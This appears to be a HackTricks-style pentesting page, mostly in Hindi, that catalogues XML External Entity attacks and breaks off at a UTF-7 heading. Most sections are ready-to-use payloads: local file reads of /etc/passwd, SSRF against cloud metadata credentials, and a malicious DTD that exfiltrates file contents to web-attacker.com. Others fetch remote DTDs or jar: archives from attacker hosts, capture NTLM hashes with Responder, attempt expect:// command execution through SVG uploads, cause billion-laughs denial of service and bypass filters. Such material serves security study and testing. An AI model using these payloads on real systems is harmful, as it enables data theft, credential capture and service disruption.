# XXE - XEE - XML External Entity

{{#include /banners/hacktricks-training.md}}

- [Dojo CTF Challenge #42 – Hex Color Palette XXE write-up](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-42)
- [lxml bug #2107279 – Parameter-entity XXE still possible](https://bugs.launchpad.net/lxml/+bug/2107279)

{{#include ../banners/hacktricks-training.md}}

## XML Basics

XML एक मार्कअप भाषा है जिसे डेटा संग्रहण और परिवहन के लिए डिज़ाइन किया गया है, जिसमें एक लचीली संरचना है जो वर्णनात्मक रूप से नामित टैग के उपयोग की अनुमति देती है। यह HTML से भिन्न है क्योंकि यह पूर्वनिर्धारित टैग के सेट तक सीमित नहीं है। JSON के उदय के साथ XML का महत्व कम हुआ है, इसके प्रारंभिक AJAX प्रौद्योगिकी में भूमिका के बावजूद।

- **Entities के माध्यम से डेटा प्रतिनिधित्व**: XML में entities डेटा के प्रतिनिधित्व की अनुमति देती हैं, जिसमें विशेष वर्ण जैसे `&lt;` और `&gt;` शामिल हैं, जो `<` और `>` के अनुरूप हैं ताकि XML के टैग सिस्टम के साथ संघर्ष से बचा जा सके।
- **XML तत्वों की परिभाषा**: XML तत्व प्रकारों की परिभाषा की अनुमति देता है, यह बताते हुए कि तत्वों को कैसे संरचित किया जाना चाहिए और उनमें कौन सा सामग्री हो सकती है, जो किसी भी प्रकार की सामग्री से लेकर विशिष्ट बाल तत्वों तक हो सकती है।
- **डॉक्यूमेंट टाइप परिभाषा (DTD)**: DTDs XML में दस्तावेज़ की संरचना और इसमें शामिल डेटा के प्रकारों को परिभाषित करने में महत्वपूर्ण हैं। ये आंतरिक, बाहरी, या संयोजन हो सकते हैं, यह मार्गदर्शन करते हुए कि दस्तावेज़ों को कैसे स्वरूपित और मान्य किया जाना चाहिए।
- **कस्टम और बाहरी Entities**: XML DTD के भीतर लचीले डेटा प्रतिनिधित्व के लिए कस्टम entities बनाने का समर्थन करता है। बाहरी entities, जिन्हें एक URL के साथ परिभाषित किया गया है, सुरक्षा चिंताओं को उठाती हैं, विशेष रूप से XML External Entity (XXE) हमलों के संदर्भ में, जो XML पार्सर्स द्वारा बाहरी डेटा स्रोतों को संभालने के तरीके का लाभ उठाते हैं: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **पैरामीटर Entities के साथ XXE पहचान**: XXE कमजोरियों का पता लगाने के लिए, विशेष रूप से जब पार्सर सुरक्षा उपायों के कारण पारंपरिक तरीके विफल हो जाते हैं, XML पैरामीटर entities का उपयोग किया जा सकता है। ये entities आउट-ऑफ-बैंड पहचान तकनीकों की अनुमति देती हैं, जैसे कि DNS लुकअप या HTTP अनुरोधों को नियंत्रित डोमेन पर ट्रिगर करना, ताकि कमजोरियों की पुष्टि की जा सके।
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Main attacks

[**इनमें से अधिकांश हमलों का परीक्षण शानदार Portswiggers XEE प्रयोगशालाओं का उपयोग करके किया गया: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### New Entity test

इस हमले में मैं यह परीक्षण करने जा रहा हूँ कि क्या एक साधारण नई ENTITY घोषणा काम कर रही है
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../images/image (870).png>)

### फ़ाइल पढ़ें

आइए विभिन्न तरीकों से `/etc/passwd` पढ़ने की कोशिश करें। Windows के लिए आप पढ़ने की कोशिश कर सकते हैं: `C:\windows\system32\drivers\etc\hosts`

इस पहले मामले में ध्यान दें कि SYSTEM "_**file:///**etc/passwd_" भी काम करेगा।
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../images/image (86).png>)

यह दूसरा मामला एक फ़ाइल निकालने के लिए उपयोगी होना चाहिए यदि वेब सर्वर PHP का उपयोग कर रहा है (यह Portswiggers प्रयोगशालाओं का मामला नहीं है)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
इस तीसरे मामले में ध्यान दें कि हम `Element stockCheck` को ANY के रूप में घोषित कर रहे हैं।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../images/image (753).png>)

### Directory listing

**Java** आधारित अनुप्रयोगों में XXE के माध्यम से **एक निर्देशिका की सामग्री को सूचीबद्ध करना** संभव हो सकता है, एक पेलोड के साथ जैसे (फाइल के बजाय बस निर्देशिका के लिए पूछना):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

एक XXE का उपयोग क्लाउड के अंदर SSRF का दुरुपयोग करने के लिए किया जा सकता है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

**पहले टिप्पणी की गई तकनीक** का उपयोग करके आप सर्वर को एक सर्वर तक पहुँचने के लिए मजबूर कर सकते हैं जिसे आप नियंत्रित करते हैं ताकि यह दिखा सके कि यह कमजोर है। लेकिन, यदि यह काम नहीं कर रहा है, तो शायद इसका कारण यह है कि **XML संस्थाएँ अनुमति नहीं दी गई हैं**, इस मामले में आप **XML पैरामीटर संस्थाओं** का उपयोग करने की कोशिश कर सकते हैं:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Exfiltrate data out-of-band

**इस अवसर पर हम सर्वर को एक नया DTD लोड करने के लिए मजबूर करेंगे जिसमें एक दुर्भावनापूर्ण पेलोड होगा जो HTTP अनुरोध के माध्यम से एक फ़ाइल की सामग्री भेजेगा (बहु-लाइन फ़ाइलों के लिए आप इसे \_ftp://**\_ के माध्यम से निकालने की कोशिश कर सकते हैं, उदाहरण के लिए इस बुनियादी सर्वर का उपयोग करते हुए [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**)। यह व्याख्या** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)** पर आधारित है।**

दिए गए दुर्भावनापूर्ण DTD में, डेटा निकालने के लिए एक श्रृंखला के चरण किए जाते हैं:

### Malicious DTD Example:

The structure is as follows:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
The steps executed by this DTD include:

1. **Parameter Entities की परिभाषा:**
- एक XML पैरामीटर एंटिटी, `%file`, बनाई जाती है, जो `/etc/hostname` फ़ाइल की सामग्री पढ़ती है।
- एक और XML पैरामीटर एंटिटी, `%eval`, परिभाषित की जाती है। यह गतिशील रूप से एक नई XML पैरामीटर एंटिटी, `%exfiltrate`, घोषित करती है। `%exfiltrate` एंटिटी को हमलावर के सर्वर पर HTTP अनुरोध करने के लिए सेट किया जाता है, जो `%file` एंटिटी की सामग्री को URL के क्वेरी स्ट्रिंग के भीतर पास करता है।
2. **एंटिटीज़ का निष्पादन:**
- `%eval` एंटिटी का उपयोग किया जाता है, जो `%exfiltrate` एंटिटी की गतिशील घोषणा के निष्पादन की ओर ले जाता है।
- फिर `%exfiltrate` एंटिटी का उपयोग किया जाता है, जो निर्दिष्ट URL पर फ़ाइल की सामग्री के साथ HTTP अनुरोध को ट्रिगर करता है।

हमलावर इस दुर्भावनापूर्ण DTD को अपने नियंत्रण में एक सर्वर पर होस्ट करता है, आमतौर पर एक URL जैसे `http://web-attacker.com/malicious.dtd` पर।

**XXE Payload:** एक कमजोर एप्लिकेशन का शोषण करने के लिए, हमलावर एक XXE payload भेजता है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
यह पेलोड एक XML पैरामीटर एंटिटी `%xxe` को परिभाषित करता है और इसे DTD के भीतर शामिल करता है। जब इसे XML पार्सर द्वारा संसाधित किया जाता है, तो यह पेलोड हमलावर के सर्वर से बाहरी DTD लाता है। फिर पार्सर DTD को इनलाइन में व्याख्या करता है, दुर्भावनापूर्ण DTD में वर्णित चरणों को निष्पादित करता है और `/etc/hostname` फ़ाइल को हमलावर के सर्वर पर भेज देता है।

### त्रुटि आधारित (बाहरी DTD)

**इस मामले में हम सर्वर को एक दुर्भावनापूर्ण DTD लोड करने के लिए मजबूर करेंगे जो एक त्रुटि संदेश के अंदर एक फ़ाइल की सामग्री दिखाएगा (यह केवल तब मान्य है जब आप त्रुटि संदेश देख सकते हैं)।** [**यहां से उदाहरण।**](https://portswigger.net/web-security/xxe/blind)

एक XML पार्सिंग त्रुटि संदेश, जो `/etc/passwd` फ़ाइल की सामग्री को प्रकट करता है, एक दुर्भावनापूर्ण बाहरी दस्तावेज़ प्रकार परिभाषा (DTD) का उपयोग करके उत्पन्न किया जा सकता है। यह निम्नलिखित चरणों के माध्यम से किया जाता है:

1. एक XML पैरामीटर एंटिटी `file` को परिभाषित किया गया है, जिसमें `/etc/passwd` फ़ाइल की सामग्री होती है।
2. एक XML पैरामीटर एंटिटी `eval` को परिभाषित किया गया है, जो एक अन्य XML पैरामीटर एंटिटी `error` के लिए एक गतिशील घोषणा को शामिल करता है। जब इस `error` एंटिटी का मूल्यांकन किया जाता है, तो यह एक गैर-मौजूद फ़ाइल को लोड करने का प्रयास करती है, जिसमें `file` एंटिटी की सामग्री को उसके नाम के रूप में शामिल किया जाता है।
3. `eval` एंटिटी को बुलाया जाता है, जिससे `error` एंटिटी की गतिशील घोषणा होती है।
4. `error` एंटिटी का आह्वान एक गैर-मौजूद फ़ाइल को लोड करने के प्रयास में परिणत होता है, जिससे एक त्रुटि संदेश उत्पन्न होता है जिसमें `/etc/passwd` फ़ाइल की सामग्री फ़ाइल नाम के भाग के रूप में शामिल होती है।

दुर्भावनापूर्ण बाहरी DTD को निम्नलिखित XML के साथ बुलाया जा सकता है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
जब निष्पादन किया जाता है, तो वेब सर्वर की प्रतिक्रिया में `/etc/passwd` फ़ाइल की सामग्री दिखाने वाला एक त्रुटि संदेश शामिल होना चाहिए।

![](<../images/image (809).png>)

_**कृपया ध्यान दें कि बाहरी DTD हमें दूसरे `eval` के अंदर एक इकाई शामिल करने की अनुमति देती है, लेकिन यह आंतरिक DTD में निषिद्ध है। इसलिए, आप बाहरी DTD का उपयोग किए बिना त्रुटि को मजबूर नहीं कर सकते (आमतौर पर)।**_

### **त्रुटि आधारित (सिस्टम DTD)**

तो जब **आउट-ऑफ-बैंड इंटरैक्शन अवरुद्ध होते हैं** (बाहरी कनेक्शन उपलब्ध नहीं होते) तो अंधे XXE कमजोरियों के बारे में क्या?

XML भाषा विनिर्देशन में एक छिद्र **त्रुटि संदेशों के माध्यम से संवेदनशील डेटा को उजागर कर सकता है जब एक दस्तावेज़ का DTD आंतरिक और बाहरी घोषणाओं को मिलाता है**। यह समस्या बाहरी रूप से घोषित इकाइयों के आंतरिक पुनर्परिभाषा की अनुमति देती है, जिससे त्रुटि-आधारित XXE हमलों का निष्पादन संभव होता है। ऐसे हमले XML पैरामीटर इकाई की पुनर्परिभाषा का लाभ उठाते हैं, जिसे मूल रूप से एक बाहरी DTD में घोषित किया गया था, एक आंतरिक DTD के भीतर से। जब सर्वर द्वारा आउट-ऑफ-बैंड कनेक्शन अवरुद्ध होते हैं, तो हमलावरों को हमले को अंजाम देने के लिए स्थानीय DTD फ़ाइलों पर निर्भर रहना पड़ता है, जिसका उद्देश्य संवेदनशील जानकारी को प्रकट करने के लिए एक पार्सिंग त्रुटि उत्पन्न करना है।

एक परिदृश्य पर विचार करें जहां सर्वर की फ़ाइल प्रणाली में `/usr/local/app/schema.dtd` पर एक DTD फ़ाइल है, जो `custom_entity` नामक एक इकाई को परिभाषित करती है। एक हमलावर एक हाइब्रिड DTD प्रस्तुत करके `/etc/passwd` फ़ाइल की सामग्री को उजागर करने वाली XML पार्सिंग त्रुटि उत्पन्न कर सकता है:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file'>">
%eval;
%error;
'>
%local_dtd;
]>
```
The outlined steps are executed by this DTD:

- एक XML पैरामीटर एंटिटी `local_dtd` की परिभाषा सर्वर की फाइल सिस्टम पर स्थित बाहरी DTD फ़ाइल को शामिल करती है।
- `custom_entity` XML पैरामीटर एंटिटी के लिए एक पुनर्परिभाषा होती है, जिसे मूल रूप से बाहरी DTD में परिभाषित किया गया था, ताकि [त्रुटि-आधारित XXE हमले](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) को संलग्न किया जा सके। यह पुनर्परिभाषा एक पार्सिंग त्रुटि को उत्पन्न करने के लिए डिज़ाइन की गई है, जो `/etc/passwd` फ़ाइल की सामग्री को उजागर करती है।
- `local_dtd` एंटिटी का उपयोग करके, बाहरी DTD को संलग्न किया जाता है, जिसमें नए परिभाषित `custom_entity` शामिल है। इस क्रियाओं के अनुक्रम से उस त्रुटि संदेश का उत्सर्जन होता है जिसे हमले के लिए लक्षित किया गया है।

**वास्तविक दुनिया का उदाहरण:** GNOME डेस्कटॉप वातावरण का उपयोग करने वाले सिस्टम अक्सर `/usr/share/yelp/dtd/docbookx.dtd` पर एक DTD रखते हैं जिसमें `ISOamso` नामक एक एंटिटी होती है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../images/image (625).png>)

चूंकि यह तकनीक एक **आंतरिक DTD का उपयोग करती है, आपको पहले एक मान्य DTD ढूंढना होगा**। आप यह **इंस्टॉल करके** कर सकते हैं कि सर्वर कौन सा **OS / सॉफ़्टवेयर** उपयोग कर रहा है और **कुछ डिफ़ॉल्ट DTDs** की खोज कर सकते हैं, या **सिस्टम के अंदर डिफ़ॉल्ट DTDs** की एक सूची **इकट्ठा** कर सकते हैं और **जांच** कर सकते हैं कि क्या इनमें से कोई भी मौजूद है:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
For more information check [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### सिस्टम के अंदर DTDs खोजना

निम्नलिखित शानदार github repo में आप **सिस्टम में मौजूद DTDs के पथ** पा सकते हैं:

{{#ref}}
https://github.com/GoSecure/dtd-finder/tree/master/list
{{#endref}}

इसके अलावा, यदि आपके पास **पीड़ित सिस्टम का Docker इमेज** है, तो आप उसी repo के टूल का उपयोग करके **इमेज** को **स्कैन** कर सकते हैं और **सिस्टम के अंदर मौजूद DTDs** के पथ को **खोज** सकते हैं। जानने के लिए [github का Readme](https://github.com/GoSecure/dtd-finder) पढ़ें।
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

इस हमले के बारे में अधिक गहन व्याख्या के लिए, **Detectify के** [**इस अद्भुत पोस्ट**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **के दूसरे सेक्शन की जांच करें**।

**Microsoft Office दस्तावेज़ अपलोड करने की क्षमता कई वेब अनुप्रयोगों द्वारा प्रदान की जाती है**, जो फिर इन दस्तावेज़ों से कुछ विवरण निकालने की प्रक्रिया में जाती हैं। उदाहरण के लिए, एक वेब अनुप्रयोग उपयोगकर्ताओं को XLSX प्रारूप की स्प्रेडशीट अपलोड करके डेटा आयात करने की अनुमति दे सकता है। स्प्रेडशीट से डेटा निकालने के लिए पार्सर को अनिवार्य रूप से कम से कम एक XML फ़ाइल को पार्स करना होगा।

इस भेद्यता का परीक्षण करने के लिए, एक **XXE पेलोड वाला Microsoft Office फ़ाइल बनाना आवश्यक है**। पहला कदम एक खाली निर्देशिका बनाना है जिसमें दस्तावेज़ को अनज़िप किया जा सके।

एक बार जब दस्तावेज़ अनज़िप हो जाता है, तो `./unzipped/word/document.xml` में स्थित XML फ़ाइल को खोला जाना चाहिए और एक पसंदीदा टेक्स्ट संपादक (जैसे vim) में संपादित किया जाना चाहिए। XML को इच्छित XXE पेलोड को शामिल करने के लिए संशोधित किया जाना चाहिए, जो अक्सर एक HTTP अनुरोध के साथ शुरू होता है।

संशोधित XML पंक्तियों को दो रूट XML ऑब्जेक्ट्स के बीच डाला जाना चाहिए। URL को अनुरोधों के लिए मॉनिटर करने योग्य URL से बदलना महत्वपूर्ण है।

अंत में, फ़ाइल को ज़िप किया जा सकता है ताकि दुर्भावनापूर्ण poc.docx फ़ाइल बनाई जा सके। पहले से बनाए गए "unzipped" निर्देशिका से, निम्नलिखित कमांड चलाया जाना चाहिए:

अब, बनाई गई फ़ाइल को संभावित रूप से कमजोर वेब अनुप्रयोग में अपलोड किया जा सकता है, और एक अनुरोध के Burp Collaborator लॉग में दिखाई देने की उम्मीद की जा सकती है।

### Jar: protocol

**jar** प्रोटोकॉल विशेष रूप से **Java अनुप्रयोगों** के भीतर सुलभ है। यह **PKZIP** संग्रह (जैसे, `.zip`, `.jar`, आदि) के भीतर फ़ाइल पहुंच सक्षम करने के लिए डिज़ाइन किया गया है, जो स्थानीय और दूरस्थ फ़ाइलों दोनों के लिए उपयुक्त है।
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
> [!CAUTION]
> PKZIP फ़ाइलों के अंदर फ़ाइलों तक पहुँच प्राप्त करना **सिस्टम DTD फ़ाइलों के माध्यम से XXE का दुरुपयोग करने के लिए सुपर उपयोगी है।** [सिस्टम DTD फ़ाइलों के दुरुपयोग के तरीके के लिए इस अनुभाग की जाँच करें](xxe-xee-xml-external-entity.md#error-based-system-dtd).

PKZIP संग्रह के भीतर एक फ़ाइल तक पहुँचने की प्रक्रिया में कई चरण शामिल हैं:

1. एक HTTP अनुरोध एक निर्दिष्ट स्थान से ज़िप संग्रह डाउनलोड करने के लिए किया जाता है, जैसे `https://download.website.com/archive.zip`.
2. HTTP प्रतिक्रिया जिसमें संग्रह होता है, अस्थायी रूप से सिस्टम पर संग्रहीत की जाती है, आमतौर पर `/tmp/...` जैसे स्थान पर।
3. फिर संग्रह को इसके सामग्री तक पहुँचने के लिए निकाला जाता है।
4. संग्रह के भीतर विशिष्ट फ़ाइल, `file.zip`, को पढ़ा जाता है।
5. संचालन के बाद, इस प्रक्रिया के दौरान बनाए गए किसी भी अस्थायी फ़ाइलों को हटा दिया जाता है।

इस प्रक्रिया को दूसरे चरण में बाधित करने की एक दिलचस्प तकनीक में संग्रह फ़ाइल को सर्व करते समय सर्वर कनेक्शन को अनिश्चितकाल के लिए खुला रखना शामिल है। इस उद्देश्य के लिए [इस रिपॉजिटरी](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) में उपलब्ध उपकरणों का उपयोग किया जा सकता है, जिसमें एक Python सर्वर (`slow_http_server.py`) और एक Java सर्वर (`slowserver.jar`) शामिल हैं।
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
> [!CAUTION]
> अस्थायी निर्देशिका में फ़ाइलें लिखना **पथ यात्रा** से संबंधित एक और भेद्यता को **बढ़ाने** में मदद कर सकता है (जैसे स्थानीय फ़ाइल शामिल करना, टेम्पलेट इंजेक्शन, XSLT RCE, डेसिरियलाइजेशन, आदि)।

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Billion Laugh Attack
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml हमला
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Quadratic Blowup Attack

![](<../images/image (527).png>)

#### NTML प्राप्त करना

Windows होस्ट पर, एक responder.py हैंडलर सेट करके वेब सर्वर उपयोगकर्ता का NTML हैश प्राप्त करना संभव है:
```bash
Responder.py -I eth0 -v
```
और निम्नलिखित अनुरोध भेजकर
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
फिर आप hashcat का उपयोग करके हैश को क्रैक करने की कोशिश कर सकते हैं

## Hidden XXE Surfaces

### XInclude

जब क्लाइंट डेटा को सर्वर-साइड XML दस्तावेजों में एकीकृत किया जाता है, जैसे कि बैकएंड SOAP अनुरोधों में, XML संरचना पर सीधा नियंत्रण अक्सर सीमित होता है, जो `DOCTYPE` तत्व को संशोधित करने पर प्रतिबंधों के कारण पारंपरिक XXE हमलों को बाधित करता है। हालाँकि, एक `XInclude` हमला एक समाधान प्रदान करता है क्योंकि यह XML दस्तावेज़ के किसी भी डेटा तत्व के भीतर बाहरी संस्थाओं को सम्मिलित करने की अनुमति देता है। यह विधि प्रभावी है, भले ही केवल सर्वर-जनित XML दस्तावेज़ के भीतर डेटा का एक भाग नियंत्रित किया जा सके।

`XInclude` हमले को निष्पादित करने के लिए, `XInclude` नामस्थान को घोषित करना होगा, और इच्छित बाहरी संस्था के लिए फ़ाइल पथ निर्दिष्ट करना होगा। नीचे एक संक्षिप्त उदाहरण दिया गया है कि इस प्रकार के हमले को कैसे तैयार किया जा सकता है:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

### SVG - फ़ाइल अपलोड

उपयोगकर्ताओं द्वारा कुछ अनुप्रयोगों में अपलोड की गई फ़ाइलें, जिन्हें फिर सर्वर पर संसाधित किया जाता है, XML या XML-समावेशी फ़ाइल स्वरूपों के प्रबंधन में कमजोरियों का लाभ उठा सकती हैं। सामान्य फ़ाइल स्वरूप जैसे कार्यालय दस्तावेज़ (DOCX) और चित्र (SVG) XML पर आधारित होते हैं।

जब उपयोगकर्ता **चित्र अपलोड करते हैं**, तो इन चित्रों को सर्वर-साइड पर संसाधित या मान्य किया जाता है। यहां तक कि उन अनुप्रयोगों के लिए जो PNG या JPEG जैसे स्वरूपों की अपेक्षा करते हैं, **सर्वर की छवि प्रसंस्करण पुस्तकालय SVG चित्रों का भी समर्थन कर सकती है**। SVG, एक XML-आधारित स्वरूप होने के नाते, हमलावरों द्वारा दुर्भावनापूर्ण SVG चित्रों को प्रस्तुत करने के लिए उपयोग किया जा सकता है, जिससे सर्वर XXE (XML External Entity) कमजोरियों के प्रति उजागर हो जाता है।

ऐसे एक हमले का उदाहरण नीचे दिखाया गया है, जहां एक दुर्भावनापूर्ण SVG चित्र प्रणाली फ़ाइलों को पढ़ने का प्रयास करता है:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
एक और विधि में PHP "expect" wrapper के माध्यम से **कमांड्स को निष्पादित करने** का प्रयास करना शामिल है:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
SVG प्रारूप का उपयोग दोनों मामलों में उन हमलों को लॉन्च करने के लिए किया जाता है जो सर्वर के सॉफ़्टवेयर की XML प्रोसेसिंग क्षमताओं का लाभ उठाते हैं, जो मजबूत इनपुट सत्यापन और सुरक्षा उपायों की आवश्यकता को उजागर करता है।

अधिक जानकारी के लिए [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) पर जाएं!

**ध्यान दें कि पढ़ी गई फ़ाइल की पहली पंक्ति या निष्पादन के परिणाम के रूप में दिखाई देगी जो बनाई गई छवि के अंदर होगी। इसलिए आपको उस छवि तक पहुँचने में सक्षम होना चाहिए जो SVG ने बनाई है।**

### **PDF - फ़ाइल अपलोड**

**XXE का उपयोग करके PDF फ़ाइल अपलोड करने के लिए कैसे शोषण करें, यह जानने के लिए निम्नलिखित पोस्ट पढ़ें:**

{{#ref}}
file-upload/pdf-upload-xxe-and-cors-bypass.md
{{#endref}}

### सामग्री प्रकार: x-www-urlencoded से XML तक

यदि एक POST अनुरोध XML प्रारूप में डेटा स्वीकार करता है, तो आप उस अनुरोध में XXE का शोषण करने का प्रयास कर सकते हैं। उदाहरण के लिए, यदि एक सामान्य अनुरोध में निम्नलिखित शामिल है:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
फिर आप निम्नलिखित अनुरोध प्रस्तुत करने में सक्षम हो सकते हैं, उसी परिणाम के साथ:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: From JSON to XEE

अनुरोध को बदलने के लिए आप “**Content Type Converter**“ नामक एक Burp Extension का उपयोग कर सकते हैं। [Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) आप यह उदाहरण पा सकते हैं:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
एक और उदाहरण [यहां](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) पाया जा सकता है।

## WAF & प्रोटेक्शन बायपास

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
यह केवल तभी काम करेगा जब XML सर्वर `data://` प्रोटोकॉल को स्वीकार करे।

### UTF-7

